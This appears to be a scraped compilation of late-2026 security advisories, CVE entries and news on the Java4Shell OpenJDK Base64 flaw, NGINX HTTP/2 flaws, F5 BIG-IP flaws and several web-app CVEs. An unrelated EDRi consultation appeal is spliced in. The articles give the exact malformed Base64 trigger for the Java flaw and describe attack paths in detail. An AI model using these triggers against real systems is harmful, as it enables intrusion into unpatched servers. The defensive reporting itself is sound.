title: Vulnérabilité dans Oracle Java SE (18 novembre 2026)
text:
Bulletin d'alerte du CERT-FR

Json

Objet : Vulnérabilité dans Oracle Java SE

Gestion du document

Référence
CERTFR-2026-ALE-016

Titre
Vulnérabilité dans Oracle Java SE

Date de la première version18 novembre 2026

Date de la dernière version18 novembre 2026

Source(s)
Bulletin de sécurité OpenJDK du 17 novembre 2026Bulletin de sécurité Oracle du 17 novembre 2026

Une gestion de version détaillée se trouve à la fin de ce document.

Risques

Déni de service à distance

Exécution de code arbitraire à distance

Systèmes affectés

Oracle GraalVM Enterprise Edition version 21.3.20.0.3

Oracle GraalVM for JDK version 17.0.21.0.3

Oracle GraalVM for JDK version 21.0.13.0.3

Oracle Java SE version 17.0.21.0.3

Oracle Java SE version 21.0.13.0.3

Oracle Java SE version 25.0.5.0.3

Oracle Java SE version 27.0.1.0.3

Oracle Java SE version 8u511b33-perf

Résumé
Le 17 novembre 2026, Oracle a publié un avis de sécurité concernant la vulnérabilité CVE-2026-114938, surnommée java4shell, qui affecte le décodeur Base64 de OpenJDK sur les processeurs x86-64 supportant AVX-512 VBMI. Celle-ci permet à un attaquant de provoquer une exécution de code arbitraire à distance et un déni de service à distance.
Cette vulnérabilité ne peut être exploitée qu'en fournissant des données en base64 aux API du composant spécifié sans recourir à des applications Java Web Start ou des applets Java non fiables. Chaque produit affecté nécessite donc une charge utile sur mesure pour être effective.
Cependant, le CERT-FR incite à la vigilance et rappelle que OpenJDK est utilisé dans de nombreux produits, notamment Keycloak, Atlassian Jira, Atlassian Confluence, JFrog Artifactory, Jenkins, PingFederate, Apache Kafka Broker, Apache Solr, Elasticsearch, Gerrit, Spinnaker, il est donc important d'appliquer les correctifs de sécurité.
Sous Linux, pour vérifier si le processeur supporte AVX-512 VBMI, la commande suivante peut être lancée :
grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n' | grep -E '^(avx512f|avx512bw|avx512vbmi|bmi2)$'
La commande doit retourner les 4 drapeaux : avx512f,avx512bw,avx512vbmi et bmi2.
Contournements provisoires
Le chercheur qui a découvert la vulnérabilité, recommande comme mesures de contournements provisoires de démarrer OpenJDK avec les options XX:-UseBASE64Intrinsics et -XX:UseAVX=2

Solutions
Se référer au bulletin de sécurité de l'éditeur pour l'obtention des correctifs (cf. section Documentation).

Date de la première version18 novembre 2026

Date de la dernière version18 novembre 2026

Une gestion de version détaillée se trouve à la fin de ce document.

Risque

Exécution de code arbitraire à distance

Systèmes affectés

NGINX Open Source versions 1.31.x antérieures à 1.31.9

NGINX Open Source versions antérieures à 1.30.7

NGINX Plus versions 3.1.x à 3.2.x antérieures à 3.7.3.0.1

NGINX Plus versions 3.7.x antérieures à 37.0.8.1

Résumé
Le 18 novembre 2026, F5 a publié deux avis de sécurité concernant les vulnérabilités CVE-2026-123633 et CVE-2026-123007. Celles-ci affectent NGINX Open Source et NGINX Plus permettent à un attaquant non authentifié d'exécuter du code à distance, en utilisant le protocole HTTP en version 2.
Le CERT-FR a connaissance d'une preuve de concept publique pour la vulnérabilité CVE-2026-123007.
Contournement provisoire
Dans l'attente de l'application des correctifs de sécurité, le CERT-FR recommande de désactiver HTTP/2.
Pour désactiver HTTP/2, le billet blogue nginx2root [1] fournit les directives suivantes :

pour NGINX versions 1.25.0 et antérieures :

listen 443 ssl;
http2 off;

pour NGINX versions 1.25.1 et postérieures :

listen 443 ssl;

Pour tester et recharger la configuration NGINX, les commandes suivantes peuvent être lancées :
sudo nginx -t && sudo nginx -s reload
openssl s_client -connect HOST:443 -servername HOST -alpn h2 &1 | grep -F 'ALPN protocol: h2'

Solutions

title: 2026-022: Critical vulnerabilities in Nginx
text:
Security Advisory 2026-022

Release Date:
18-11-2026 17:30:42

Critical vulnerabilities in Nginx

Download

Download PDF

Download MARKDOWN

Download JSON

History:18/11/2026 --- v1.0 -- Initial publicationSummaryOn 18 November 2026, F5 published an advisory addressing five vulnerabilities in NGINX that allow an unauthenticated remote attacker to execute code with the privileges of the NGINX worker process [1, 2]. While researchers managed to successfully demonstrate the use of CVE-2026-123007 [1], no exploitation in the wild has been reported yet.It is recommended to swiftly update NGINX as soon as possible, prioritising internet facing appliances. Technical DetailsThe vulnerability CVE-2026-123007, with a CVSS score of 8.1, is an integer overflow in HTTP/2 flow control which causes an out-of-bounds write on the heap. The only precondition is HTTP/2 enabled on a listening port.The vulnerability CVE-2026-123633, with a CVSS score of 8.1, is a use-after-free flaw occurring when connection draining closes an active HTTP/2 connection while NGINX connects to an upstream server. HTTP/2 should be enabled and requests should be forwarded to an upstream server.The vulnerability CVE-2026-121810, with a CVSS score of 8.1, is a use-after-free flaw occurring when a QUIC connection is drained during stream creation and upstream connection. HTTP/3 should be enabled and requests should be forwarded to an upstream server.The vulnerability CVE-2026-123634, with a CVSS score of 8.1, is a use-after-free flaw occurring in the processing of the DNS resolver waiting list. a resolver must be set, a proxy_pass destination built from request data, and mirror with mirror_request_body off should be configured.The vulnerability CVE-2026-113425, with a CVSS score of 8.1, is a use-after-free occurring when the client closes the connection during the auth_http authentication lookup. A mail proxy must be configured with proxy on and auth_http.All five vulnerabilities can lead to unauthenticated code execution with the privileges of the NGINX worker process [1]. Affected ProductsThe following products and versions are affected by one or more of the above vulnerabilities:NGINX Open Source (mainline) from version 1.9.5 to 1.31.8 (range depends on the vulnerability, see Technical Details) [1]. Refer to the vendor advisory for the information on fixed versions [2].NGINX Open Source (stable) versions 1.30.x, including the current stable version 1.30.6 [1, 3]. Refer to the vendor advisory for the information on fixed versions [2].NGINX Plus from version 37.0.0 to 37.0.7.1, and 37.1.0 to 37.2.0.1. The versions R34, R35 and R36 are also affected [2]. Refer to the vendor advisory for the information on fixed versions [2]. CERT-EU recommends updating vulnerable instance as soon as possible, prioritising internet-facing devices.Compromise assessmentIt is possible to monitor for crashes of the Nginx worker (worker process … exited on signal in the error log). However, this is not a high-fidelity indicator of successful remote code execution but rather an indication of exploitation attempts. Further checks in the process creation logs are necessary.MitigationWhen updating is not immediately possible, disabling HTTP/2 on exposed listeners (by removing the http2 from the listen directives, or set http2 off;) mitigates the vulnerabilities CVE-2026-123007 and CVE-2026-123633 [1].References[1] https://xint.io/blog/nginx2root-remote-code-execution[2] https://my.f5.com/manage/s/article/K000164058[3] https://nginx.org/en/security_advisories.html

High Severity Vulnerability in Java SE and OpenJDK

History:18/11/2026 --- v1.0 -- Initial publicationSummaryOn 17 November 2026, Oracle and the OpenJDK project released fixes for CVE-2026-114938, a high severity vulnerability in OpenJDK which could lead, under certain circumstances, in unauthenticated Remote Code Execution (RCE) [1, 2, 3].CERT-EU recommends updating vulnerable version of OpenJDK, prioritising internet facing applications.Technical DetailsThe vulnerability CVE-2026-114938, with a CVSS score of 8.1, is a memory corruption vulnerability in OpenJDK which leads to Denial of Service (DoS) conditions, and in some cases to unauthenticated RCE [3].Exploitation requires all of the following conditions:The Java Virtual Machine (JVM) runs on an x86-64 CPU with avx512f, avx512bw, avx512vbmi and bmi2 (Intel Xeon Ice Lake or later, AMD Zen 4 or later). ARM64 systems are not affected.The intrinsic is active. This is the default when the CPU supports these features.Attacker-controlled Base64 data reaches the decoder, for example through HTTP Basic authentication, JWT, SAML messages, cookies or TLS data.Affected ProductsThe following products are affected by this vulnerability [1, 2]:Oracle Java SE 8 (performance builds) version 8u511-perf (fixed released: 8u513)Oracle Java SE / OpenJDK 17 from 17.0.6 to 17.0.21 (fixed released: 17.0.21.1)Oracle Java SE / OpenJDK 21 21.0.13 and earlier (fixed released: 21.0.13.1)Oracle Java SE / OpenJDK 25 25.0.5 and earlier (fixed released: 25.0.5.1)Oracle Java SE / OpenJDK 27 27.0.1 and earlier (fixed released: 27.0.1.1)Oracle GraalVM for JDK 17 and 21 releases (fixed released: Refer to the vendor)These products support many known applications such as Keycloak, some Atlassian products, JFrog Artifactory.OpenJDK-based distributions are also affected: Eclipse Temurin, Amazon Corretto, Azul Zulu, Microsoft Build of OpenJDK, BellSoft Liberica, SAP SapMachine and Red Hat build of OpenJDK. These vendors release fixes on their own schedules. Products that include their own Java runtime are affected until their vendor supplies an update. CERT-EU recommends updating vulnerable version of OpenJDK, prioritising internet facing applications, and restarting all JVMs after the update.MitigationWhere it is not possible to immediately update, it is possible to disable the intrinsic feature using the JVM option -XX:+UnlockDiagnosticVMOptions -XX:-UseBASE64Intrinsics. As an alternative, disable AVX-512 with -XX:UseAVX=2 [3]. The second option can reduce performance. Both options need a JVM restart. To verify the setting, run java -XX:+PrintFlagsFinal -version | grep UseBASE64Intrinsics.References[1] https://openjdk.org/groups/vulnerability/advisories/2026-11-17[2] https://www.oracle.com/java/technologies/javase/17-0-21-1-relnotes.html[3] https://www.vulncheck.com/blog/java4shell

title: Participate in the Public Consultation on the European Commission’s KIDS Act Proposal
text:
Skip to content

Close

Search

How would you best describe that thing you're looking for?

The European Commission recently published a proposal for a Regulation aiming to ensure greater safety for young people online, called the KIDS Act. It then opened a public consultation for everyone to speak up about their support or concerns – and oh do we have some!
While EDRi is still in the process of finalising its position and recommendations for this file, there are certain elements which are very clear already. We invite all readers of the EDRi-gram to submit a short opinion to the consultation, open until 3 December at midnight, covering at least the following points:

Criticising the widespread and mandatory use of age verification: because of it, everybody becomes suspected of being a child until proven innocent; many people will not be willing or able to prove they are of the right age (because they lack IT equipment, ID documents, digital literacy, or trust) and will therefore be unfairly restricted in their exercise of fundamental rights online.
Arguing that social media bans should come as last resort: if they are deployed at all, the age verification-powered ban should only be applied if the provider of the service can demonstrate that it hasn’t managed to mitigate the risks facing young people. In such cases, bans should be limited to the relevant part of the service, instead of covering it in whole.
Arguing that every protection granted to young people should also be offered to adults: no one, whether they are 15, 18 or 88 years old, wants or deserves services designed to lead to “excessive or compulsive use” (article 9), recommender systems optimisation which exploit the user’s vulnerability (article 10(2)), or which determines what is best for the user through tracking-based “implicit engagement-based signals” (a.k.a. tracking).
Underlining that young people have the right to be online and exercise their freedoms, and that the proposal goes against the United Nations General Comment No. 25 (2021) on children’s rights in relation to the digital environment. This is particularly important in today’s context, where thousands of young people of all ages use social media in the context of protests to inform, express and mobilise themselves, and to document police violence.
Criticising the proof of parental authority as too extreme (article 26), and criticising the power that guardians have over the child account as overly intrusive (pre-approving contacts, article 6(2); overseeing the content viewed by the child, article 7(4)(d)).

In this episode of “What’s in the SOSS?” host Sally Cooper sits down with Sal Kimmich – security architect, author, and OpenSSF mentor – to explore the critical intersection of open source security, artificial intelligence, and kernel-level defense. title: CVE-2026-73971 - Music Assistant: Remote Code Execution by authenticated user
text:
8.0

HIGH
CVSS 3.1

CVE-2026-73971
Music Assistant: Remote Code Execution by authenticated user

Music Assistant is an open-source media library manager that integrates streaming services with connected speakers. Prior to 2.8.0, parse_arguments() passes the caller-controlled return_type parameter for config/core/get_value, config/providers/get_value, and config/players/get_value to parse_value() and Python eval() when resolving type parameters in music_assistant/helpers/api.py. Any authenticated user, regardless of role, can reach these commands through the WebSocket /ws endpoint or the REST JSON-RPC /api endpoint, causing arbitrary Python code to run with the Music Assistant server process privileges before command-handler validation, even if the request later fails. A default installation requires no special configuration, and compromise can expose secrets and configuration, alter library data, and control the application container. This issue is fixed in version 2.8.0.

MyMangaDB is a self-hosted manga collection manager with automatic metadata, MyAnimeList import, Docker support, and collection statistics. Prior to 2.7.2, the unauthenticated /api/v1/database/import handler in backend/app/api/v1/endpoints/database.py accepts a ZIP archive and moves an included database file to DATABASE_PATH while also replacing IMAGE_PATH content. An attacker can supply a database containing an attacker-controlled users table and administrative account, then authenticate as that account; invalid replacement data can also destroy application data or availability. This issue is fixed in version 2.7.2.

CVE-2026-77296
MyMangaDB: Unauthenticated path traversal in cover-image upload allows arbitrary file write, escalating to the same database-overwrite takeover

MyMangaDB is a self-hosted manga collection manager with automatic metadata, MyAnimeList import, Docker support, and collection statistics. Prior to 2.7.2, the unauthenticated /api/v1/images/manga/save handler in backend/app/api/v1/endpoints/image.py accepts a client-controlled filename and joins it to IMAGE_SAVE_PATH without confining the result. An attacker can replace the database to plant an administrative user and can overwrite other writable files, causing full application compromise and availability loss. This issue is fixed in version 2.7.2.

title: CVE-2026-76100 - OwnPay: Alipay payment-notification signature check fails open, allowing unauthenticated payment forgery
text:
8.2

HIGH
CVSS 4.0

CVE-2026-76100
OwnPay: Alipay payment-notification signature check fails open, allowing unauthenticated payment forgery

OwnPay is a self-hosted open-source payment gateway automation platform. In 0.2.0 and earlier, modules/gateways/alipay/AlipayGateway.php fails open when an Alipay callback lacks a signature or the merchant has no configured public key because verify(array $callbackData, array $credentials) falls back to an undefined mode credential that defaults to test mode, while verifyWebhook() returns true unconditionally. An unauthenticated request to POST /webhook/{gateway} can provide a pending order reference and matching amount, pass both verification gates without a valid payment signature, and cause the order and corresponding payment-received ledger entries to be marked completed. No fixed version is available as of this review.

text:
9.8

CRITICAL
CVSS 3.1

CVE-2026-73969
AnsibleForms: Authentication bypass via hard-coded default JWT signing secret

AnsibleForms is a self-hosted web application that turns automation into self-service forms. Prior to 6.2.1, AnsibleForms uses a public hard-coded fallback JWT signing secret from server/config/auth.config.js when ACCESS_TOKEN_SECRET is unset. An unauthenticated attacker can sign a self-contained token with privileged claims because server/src/auth/auth_jwt.js verifies the signature without reloading the user from the database, and server/src/lib/middleware.js trusts the token's roles and options for authorization. A forged token can therefore be accepted as an administrator session, resulting in authentication bypass and full privileged API access. This issue is fixed in version 6.2.1.

AnsibleForms is a self-hosted web application that turns automation into self-service forms. This issue is fixed in version 6.2.1.

title: CVE-2026-55508 - Wavelog has unauthenticated SQL injection in the OQRS callsign log search
text:
9.4

CRITICAL
CVSS 3.1

CVE-2026-55508
Wavelog has unauthenticated SQL injection in the OQRS callsign log search

Wavelog is web-based amateur radio logging software. Prior to 2.5, the callsign parameter accepted by POST /oqrs/search_log in application/controllers/Oqrs.php search_log() reaches application/models/Oqrs_model.php search_log(), where it is concatenated directly into a raw SQL WHERE clause without parameter binding. An unauthenticated remote attacker can use UNION-based SQL injection to read arbitrary application database records, including account data, password hashes, API keys, station credentials, reset tokens, QSO data, and station metadata. Disclosure of password reset tokens can be combined with the forgot_password workflow to take over accounts, including administrator accounts. This issue is fixed in version 2.5.

title: CVE-2026-55506 - Wavelog: Authenticated Arbitrary File Deletion via QSL Image Filename Path Traversal
text:
9.6

CRITICAL
CVSS 3.1

CVE-2026-55506
Wavelog: Authenticated Arbitrary File Deletion via QSL Image Filename Path Traversal

Wavelog is web-based amateur radio logging software. Prior to 2.5, the filename parameter accepted by POST /qsl/addQsoToQsl in application/controllers/Qsl.php addQsoToQsl() is stored without rejecting directory separators or relative path components, and POST /qsl/delete reaches application/models/Qsl_model.php deleteQsl(), which passes the planted qsl_images filename to unlink(). A standard authenticated user can associate the malicious filename with the user's own QSO, satisfy the ownership check, escape the per-user QSL image directory, and delete files writable by the PHP worker. Deleting configuration or operational files can cause denial of service, while deleting installer gate files can reopen the unauthenticated installer and enable application identity takeover through attacker-controlled database configuration. This issue is fixed in version 2.5.

title: CVE-2026-55171 - Open OnDemand: Predictable OIDCCryptoPassphrase default + ood-ansible variable mismatch enables session forgery
text:
9.1

CRITICAL
CVSS 4.0

CVE-2026-55171
Open OnDemand: Predictable OIDCCryptoPassphrase default + ood-ansible variable mismatch enables session forgery

Open OnDemand is an open-source high-performance computing portal. Prior to Open OnDemand 4.1.6 and 4.2.3, and prior to ood-ansible 4.2.1, the portal generator defaults OIDCCryptoPassphrase to SHA1(servername), and the templates/ood_portal.yml.j2 role checks a different variable from the documented passphrase setting. Administrators who set ood_oidc_crypto_passphrase can therefore believe a strong secret is configured while the deployment continues to use an attacker-derivable value. In OIDCSessionType client-cookie deployments, an unauthenticated remote attacker can derive the encryption key and forge a mod_auth_openidc_session cookie for another user, while server-cache deployments permit lower-impact tampering with protected OIDC state and nonce cookies. This issue is fixed in Open OnDemand versions 4.1.6 and 4.2.3 and ood-ansible version 4.2.1.

title: CVE-2026-55169 - Open OnDemand: Plaintext user authentication stored in access.logs for NoVNC access
text:
8.4

HIGH
CVSS 4.0

CVE-2026-55169
Open OnDemand: Plaintext user authentication stored in access.logs for NoVNC access

Open OnDemand is an open-source high-performance computing portal. Prior to 4.1.6 and 4.2.3, the Open OnDemand dashboard includes noVNC passwords in query parameters generated by apps/dashboard/app/helpers/batch_connect/sessions_helper.rb and apps/dashboard/app/views/batch_connect/sessions/connections/_novnc.html.erb. The server records those query strings in per-user PUN access logs, and insufficiently protected log directories can allow another local user to recover and replay a launch URL. Replaying the credential grants access to the running remote desktop and can result in horizontal or vertical privilege escalation according to the privileges of the desktop owner. This issue is fixed in versions 4.1.6 and 4.2.3.

title: CVE-2026-59961 - mini-snmpd: Unauthenticated out-of-bounds read in SNMP request parser (decode_oid/decode_str/decode_ptr)
text:
8.2

HIGH
CVSS 3.1

CVE-2026-59961
mini-snmpd: Unauthenticated out-of-bounds read in SNMP request parser (decode_oid/decode_str/decode_ptr)

mini-snmpd is a minimal SNMP agent implementation. Prior to 1.7, the ASN.1 BER parser in protocol.c does not verify that an attacker-controlled field length is no greater than the remaining packet size before decode_str(), decode_oid(), and decode_ptr() evaluate size - len + 1. When len exceeds size, unsigned size_t arithmetic wraps and bypasses the bounds check, allowing the decoder to read beyond the 2048-byte packet buffer. Parsing occurs before the SNMP community string is checked, so a remote unauthenticated attacker can send one crafted request to UDP port 161 to crash the process and potentially disclose adjacent heap memory. This issue is fixed in version 1.7.

title: 10-Year-Old NGINX HTTP/2 Flaw Lets Unauthenticated Attackers Execute Code on Servers
text:
10-Year-Old NGINX HTTP/2 Flaw Lets Unauthenticated Attackers Execute Code on ServersSwati KhandelwalNov 18, 2026Vulnerability / Web Security

//<![CDATA[
document.addEventListener("DOMContentLoaded",()=>{let t=document.querySelector("h1.story-title"),m=document.querySelector(".postmeta");t&&m&&t.insertAdjacentElement("afterend",m)})
//]]>

A flaw in NGINX's HTTP/2 support can allow an attacker to run code on servers with HTTP/2 enabled, without needing to log in.

The decade-old flaw, CVE-2026-123007, dubbed "nginx2root," has been present in NGINX's open-source code since version 1.9.5, released on September 22, 2015. Fixed versions 1.31.9 and 1.30.7 came out today.

F5, the company behind NGINX, says attackers can run code where ASLR is turned off or can be bypassed. Security researchers at Wiz said they bypassed ASLR and ran code through the flaw in tests. Xint's researchers said they ran code through it with nothing more than a reachable HTTP/2 port.

Code run this way gets the permissions of an NGINX worker process. Getting root on the host takes a second way to raise privileges, according to CIRCL, the Computer Incident Response Center Luxembourg.

In Xint's tests, code running as a worker could get root on the host through a separate bug in the Linux kernel's SCTP code, even when NGINX ran inside a Docker container.

Neither the vendor nor the Wiz and Rapid7 researchers have reported any attacks exploiting the flaw so far. CISA's Known Exploited Vulnerabilities catalog did not list it as of today.

Proof-of-concept code for the flaw is publicly available on GitHub, but its notes state it is suitable only for demonstrating the attack against a freshly started Docker container on the same machine.

Every open-source release from 1.9.5 through 1.31.8 is vulnerable, according to NGINX's security advisories. That includes 1.31.8 from October 21, as well as the October 14 security releases 1.31.7 and 1.30.6.

Wiz PoC

NGINX Plus is affected too, in 37.x releases before the fixed builds and in R34 to R36, according to the vendor advisory.

Today's releases also fix four more flaws that the vendor says can lead to code execution under the same ASLR condition. It scores all five 9.2 out of 10 on CVSS 4.0.

Each flaw can be reached only in a particular setup:

Flaw
What it needs

CVE-2026-123007
HTTP/2 turned on

CVE-2026-123633
HTTP/2, with requests passed to a backend server while the worker is running low on worker_connections

CVE-2026-123634
A proxied server name built from variables, plus a server-side include (SSI) or mirror subrequest to a location that looks up the same name

CVE-2026-121810
HTTP/3 turned on

CVE-2026-113425
NGINX used as a mail proxy

HTTP/2 is on where a listen directive includes http2, or where http2 on is set. Running openssl s_client with -alpn h2 against a server shows whether it accepts HTTP/2: the output reads ALPN protocol: h2 if it does. Behind a CDN, test the NGINX origin itself, because an origin that accepts only HTTP/1.1 cannot be attacked through HTTP/2.

Fixes, Workarounds and Signs of Attack

These releases fix CVE-2026-123007, according to F5:

NGINX Open Source 1.31.0 to 1.31.8 (mainline): fixed in 1.31.9
NGINX Open Source 1.9.5 to 1.30.6, including older branches such as 1.28: fixed in 1.30.7
NGINX Plus 37.1.0 to 37.2.0.1: fixed in 37.3.0.1
NGINX Plus 37.0.0 to 37.0.7.1: fixed in 37.0.8.1
NGINX Plus R34 to R36: no fix listed

Versions 1.31.9 and 1.30.7 fix all five flaws, according to NGINX's release notes. On NGINX Plus, 37.3.0.1 and 37.0.8.1 fix four of the flaws, and the CVE-2026-123633 fix was introduced in the earlier builds 37.2.0.1 and 37.0.7.1.

After upgrading, restart NGINX fully or use its live binary upgrade. A reload alone leaves the old executable running, and existing connections can stay on old worker processes.

The official Docker images for NGINX had 1.31.9 and 1.30.7 tags as of today, including Alpine variants.

Ubuntu and Debian had not shipped fixed packages as […]

title: F5 Warns 6 Critical BIG-IP Flaws Can Crash Traffic in Specific Setups, May Allow RCE
text:
F5 Warns 6 Critical BIG-IP Flaws Can Crash Traffic in Specific Setups, May Allow RCESwati KhandelwalNov 18, 2026Network Security / Vulnerability

//<![CDATA[
document.addEventListener("DOMContentLoaded",()=>{let t=document.querySelector("h1.story-title"),m=document.querySelector(".postmeta");t&&m&&t.insertAdjacentElement("afterend",m)})
//]]>

Six critical vulnerabilities in F5 BIG-IP allow an attacker to crash the Traffic Management Microkernel (TMM) without logging in, disrupting traffic until the TMM restarts.

Each flaw needs a specific setup on a virtual server: an iRule that uses a particular command, or an APM policy that includes two particular kinds of agent.

F5, which makes BIG-IP, disclosed the flaws today and says they may also allow remote code execution. The company has released engineering hotfixes and lists no workaround.

The company rates all six 9.8 under CVSS v3.1 and 9.3 under CVSS v4.0. They are stack-based buffer overflows in BIG-IP's data plane, the part that processes almost all of its network traffic. The management side is not exposed, according to the company.

None of the company's advisories says the flaws have been exploited. WatchTowr researcher Sina Kheirkhah reported four, and the company found the other two itself.

Five of the flaws are in iRules, a BIG-IP feature that administrators use to manage traffic, and one is in BIG-IP's APM module. Some also affect BIG-IP Next for Kubernetes and BIG-IP CNF, part of the company's BIG-IP Cloud-Native Edition.

Each flaw needs the setup listed below on a virtual server:

CVE-2026-123637: an APM per-request policy that includes both the Client Information agent and Endpoint Security agents. Affects BIG-IP APM only.
CVE-2026-121805: an iRule that uses PEM::subscriber on client traffic. Affects BIG-IP PEM, BIG-IP Next for Kubernetes and, as of today, BIG-IP CNF.
CVE-2026-120292: an HTTP profile and an iRule that uses MR::message route. Affects BIG-IP (all modules) and BIG-IP Next for Kubernetes.
CVE-2026-120285: an HTTP profile and an iRule that uses PSC::ip_address. Affects BIG-IP (all modules), BIG-IP Next for Kubernetes and, as of today, BIG-IP CNF.
CVE-2026-116953: an iRule that uses GENERICMESSAGE::route on client traffic. Affects BIG-IP (all modules) and BIG-IP Next for Kubernetes.
CVE-2026-120722: an iRule that uses DNS::scrape on client traffic. Affects BIG-IP DNS and BIG-IP Next for Kubernetes. The company's advisory lists BIG-IP CNF as not vulnerable, but its CVE record, updated today, lists CNF as affected.

F5's security notification lists the 22 advisories it published today, including 10 for NGINX.

For the six critical flaws, the only fixes are engineering hotfixes, builds that the company issues between its normal software releases. No scheduled release is listed as a fix, and the advisories provide no workaround until a hotfix is installed.

The company warns that "engineering hotfixes do not undergo the extensive QA assessment of scheduled software releases." Its hotfix policy adds that they come with no warranty or promise that they will work.

A system on a custom engineering hotfix needs a new one from the company's support team.

BIG-IP Next for Kubernetes is fixed in BNK-2.4.2-EHF1, BNK-2.3.4-EHF1 and BNK-2.2.5-EHF1, for versions 2.4.0 to 2.4.2, 2.3.0 to 2.3.4 and 2.2.0 to 2.2.5. BIG-IP CNF, on the same version ranges, is fixed in CNF-2.4.2-EHF1, CNF-2.3.4-EHF1 and CNF-2.2.5-EHF1 for CVE-2026-121805 and CVE-2026-120285.

The company checks only versions that are still within technical support, so an older release missing from its tables has not been shown to be safe.

Today's flaws differ from CVE-2026-94127, an APM flaw that F5 disclosed on September 22 and that was later exploited. The U.S. Cybersecurity and Infrastructure Security Agency (CISA) added it to its Known Exploited Vulnerabilities catalog the same day.

That flaw is a heap-based buffer overflow in APM setups that serve as OAuth authorization servers, allowing […]

title: Critical Apache Roller RCE Flaw Under Active Exploitation, No Authentication Required
Java4Shell Flaw Threatens Global Enterprises, Java Application Ecosystem
text: Elizabeth Montalbano,Contributing WriterNovember 18, 20266 Min ReadSource: Nikreats via Alamy Stock Photo A critical flaw in an open source runtime at the heart of the Java programming language allows unauthenticated attackers to perform remote code execution (RCE) on myriad Java applications used globally across enterprise organizations.The memory corruption vulnerability exists in versions of OpenJDK, a popular open source runtime. Researchers at security startup Calif demonstrated a general proof-of-concept (PoC) exploit for the flaw, dubbed "Java4Shell" and discovered with the help of artificial intelligence (AI), according to a report published Tuesday.However, they are holding back the release of "weaponized chains for individual products" to give organizations time to upgrade to patch the vulnerability, officially tracked as CVE-2026-114938 and rated as 9.2 under CVSS 4.0, in affected applications, Calif security engineer Quang Luong wrote in the post.Java4Shell affects the following releases: Java 17: 17.0.6 to 17.0.21; Java 21: up to 21.0.13 affected; Java 25: up to 25.0.5; Java 27: up to 27.0.1; Java 8, 8u511b33-perf, its Performance Pack build. Java 11 and Java 17.0.0 to 17.0.5 remain unaffected. OpenJDK published a security advisory on the flaw, and Oracle released a patch yesterday to fix the issue in the affected versions of Java. "All Java users should update immediately," Luong recommended.Issue Lies in Base64 Decoding The flaw exists because of how OpenJDK decodes Base64, a common way of representing binary data as text in authentication protocols, in file uploads, and to deliver network messages."To decode Base64 faster, OpenJDK uses specialized x86-64 CPU instructions to process many bytes at once," Luong explained. "We discovered a bug in that optimized machine-level code that lets malformed input overwrite neighboring memory."Specifically, OpenJDK uses specialized AVX-512 VBMI instructions on supported x86-64 processors, he explained. The bug is present in the hand-rolled assembly code that handles the final few characters."For the 65-character input above, OpenJDK allocates a 50-byte result array," Luong wrote. "After decoding the first 64 characters, the routine mishandles the stray = and calculates a negative output length. That invalid length becomes a full 64-byte write, sending 62 bytes past the end of the array."Java eventually rejects the input, but by then neighboring objects may already be corrupted, he added. Thus, attackers can exploit the bug to reveal sensitive memory, as the highly critical OpenSSL flaw Heartbleed did in 2014, or to perform RCE. "The corruption itself can be triggered by just 64 A characters followed by a single =:," Luong wrote. Java4Shell and Ghosts of Flaws PastMuch like previous high-profile flaws before it, including not only Heartbleed but also PHP2Shell and Log4Shell, the flaw has potential to create a security quagmire across entire technology ecosystems because of how widespread the use of the vulnerable software component is. Indeed, Java "is the beating heart of the modern economy" and the third most popular programming language, powering 90% of Fortune 500 companies, Luong wrote.Log4Shell, disclosed in 2021, affected Apache Log4j, a commonly used Java logging library, and enabled attackers to execute malicious code remotely. More recently, PHP2Shell, disclosed in October 2026, exposed critical vulnerabilities in the PHP runtime that could allow unauthenticated attackers to execute code on vulnerable servers.Both flaws highlighted the difficulty of identifying vulnerable components hidden within applications and third-party software used across organizations; Java4Shell is similar in this respect because it gives attackers a direct route to enterprise environments through otherwise trusted apps."Java4Shell is a reminder that the software underneath your applications is also your attack surface," observes Dom Glavach, CISO at application security solutions […]

title: How Cloudflare WAF helps protect against Java4Shell (CVE-2026-114938)
text: On November 17, 2026, the security research company Calif disclosed Java4Shell (CVE-2026-114938), a memory-corruption vulnerability in the Base64 decoder of OpenJDK, the most widely used Java runtime. Under the Common Vulnerability Scoring System (CVSS) 4.0, it scores 9.2 out of 10 (Critical). The flaw affects Java. OpenJDK published a security advisory and Oracle released patched builds in its November 2026 Critical Patch Update the same day, at 21:00 UTC.The vulnerability lets a remote attacker with no credentials send malformed Base64 data to a Java application and overwrite memory next to the decoded output. Calif turned that overwrite into a leak of heap memory, similar to Heartbleed, and into remote code execution. Calif demonstrated pre-authentication remote code execution against Keycloak, Atlassian Jira, Atlassian Confluence, JFrog Artifactory, Jenkins and PingFederate in their default configurations, and post-authentication remote code execution against Apache Kafka, Apache Solr, Elasticsearch, Gerrit, and Spinnaker.Cloudflare has released a new set of rules in the Cloudflare Managed Ruleset designed to detect malformed Base64 input patterns associated with this vulnerability. The rules are available on Pro, Business and Enterprise plans and are enabled by default with the Log action because malformed input and some benign application-specific token formats can resemble exploitation attempts. Blocking by default could therefore disrupt legitimate traffic. Customers can review matching requests in Security Events now and change the rules action to Block once they confirm it does not affect legitimate traffic. The WAF is an additional layer of defense, not a replacement for the patch. Java4Shell can be reached through paths a WAF does not see, like outbound TLS responses, and the only complete fix is to update the Java runtime. Our analysts continue to monitor attack activity and will update the rules as new techniques and variations appear. You can track rule changes in the WAF changelog and get more information on how the vulnerability develops on the dedicated Cloudflare Zero Wire briefing.We have seen no indication so far that Java4Shell was exploited on Cloudflare infrastructure.Copy linkWhat we know about the vulnerabilityBase64 is a common way to represent binary data as text. Java applications decode Base64 when they process authentication headers, tokens, file uploads and many network messages. To decode it faster, OpenJDK replaces frequently used code with specialized machine code, called intrinsics. On supported x86-64 processors, the Base64 intrinsic uses AVX-512 instructions to process 64 bytes at a time.The bug sits in the handwritten assembly that handles the final characters of the input. When the tail of the input contains padding characters (=) in a position where valid Base64 never places them, the routine calculates a negative output length. That invalid length turns into a full 64-byte write. For a 65-character input, made of 64 characters followed by a single =, OpenJDK allocates a 50-byte output array and then writes 62 bytes past its end.Java eventually rejects the input as invalid and throws an exception. By then, the neighboring memory has already been overwritten. An application's own input validation does not help, because the corruption happens inside the decoder before the application can reject the data.The simplest trigger is 64 A characters followed by =. On OpenJDK 17, the trigger needs 128 characters followed by =, because the threshold for the fast code path is higher.Exploitation is not point-and-shoot. The overwritten bytes are mostly fixed values, and the attacker controls only where the write lands. To build a working exploit, Calif arranged the Java heap so that the overflow enlarged neighboring arrays, which gave them first a way to read heap memory and then a way to write chosen bytes. Each target application requires its own exploit chain. Calif reported developing its first […]

